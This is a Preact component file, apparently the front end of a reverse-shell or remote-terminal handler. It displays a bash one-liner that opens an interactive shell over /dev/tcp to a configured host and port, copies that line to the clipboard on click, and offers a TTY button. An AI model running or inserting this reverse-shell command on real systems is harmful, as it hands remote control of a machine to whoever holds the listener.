import { useCallback } from 'preact/hooks'
import './control.css'

const Command = ({ port, hostname, id }) => {
  const command = (
    `bash -c 'exec<>/dev/tcp/${hostname}/${port};` +
    `echo>&0 ${id};$0 -i<&0>&0 2>&0'`
  )
  const handleClick = useCallback(() => {
    navigator.clipboard.writeText(command)
  }, [command])
  return (
    <div class="command" onClick={handleClick}>{command}</div>
  )
}

const Tty = ({ onTty }) => {
  return (
    <button class="tty" onClick={onTty}>TTY</button>
  )
}

const Control = ({ port, hostname, id, onTty }) => (
  <div class="control">
    <Command port={port} hostname={hostname} id={id} />
    <div />
    <Tty onTty={onTty} />
  </div>
)

export { Control }
